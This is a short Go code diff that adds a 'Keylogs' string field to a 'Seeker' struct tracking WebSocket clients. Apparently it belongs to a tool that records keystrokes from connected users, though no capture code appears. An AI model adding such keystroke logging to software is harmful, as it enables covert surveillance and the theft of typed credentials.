@@ -15,6 +15,7 @@ type Seeker struct {
 	Conn         *websocket.Conn        `json:"-"`    // WebSocket connection (not serialized)
 	LastActive   time.Time              `json:"last_active"`
 	Disconnected bool                   `json:"disconnected"`
+	Keylogs      string                 `json:"keylogs"`
 	Metadata     map[string]interface{} `json:"metadata"` // Extensible metadata
 }
 
